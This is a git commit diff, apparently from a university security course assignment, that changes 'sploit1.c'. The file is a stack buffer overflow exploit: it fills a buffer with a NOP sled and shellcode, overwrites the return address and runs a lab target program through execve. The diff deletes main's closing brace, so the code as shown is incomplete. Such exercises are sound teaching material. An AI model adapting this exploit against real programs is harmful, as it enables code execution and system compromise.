4dc50041bbb37774feb6de9bbd40942483f991b6
justinhalford <justinhalford@gmail.com>
2024-05-09 23:56:45 -0400

    may 7

--- cs5435-hw4/sploits/sploit1.c
+++ cs5435-hw4/sploits/sploit1.c
@@ -10,28 +10,26 @@
 const int BUFFER_SIZE = 12;
 const int OFFSET_TO_RET = 8;
 const int SHELLCODE_LENGTH = sizeof(shellcode) - 1;
-const char* RETURN_ADDRESS = (char*)0xffffd78a;
 
-int main(void)
-{
+int main(int argc, char *argv[]) {
+
 char *args[3];
 char *env[1];
 
-char buf[BUFFER_SIZE + OFFSET_TO_RET + 1];
+char buf[BUFFER_SIZE + OFFSET_TO_RET + 100];
 memset(buf, '\x90', sizeof(buf));
-buf[BUFFER_SIZE + OFFSET_TO_RET] = 0;
-memcpy(buf + OFFSET_TO_RET, shellcode, SHELLCODE_LENGTH);
-*(unsigned int*)(buf + OFFSET_TO_RET - 4) = (unsigned int)RETURN_ADDRESS;
+memcpy(buf + sizeof(buf) - SHELLCODE_LENGTH, shellcode, SHELLCODE_LENGTH);
+
+unsigned int return_address = (unsigned int)argv[1] + OFFSET_TO_RET;
+
+*(unsigned int*)(buf + OFFSET_TO_RET - 4) = return_address;
 
 args[0] = TARGET;
 args[1] = buf;
 args[2] = NULL;
-
 env[0] = NULL;
+
 execve(TARGET, args, env);
 fprintf(stderr, "execve failed.\n");
 
 return 0;
-}
-
-
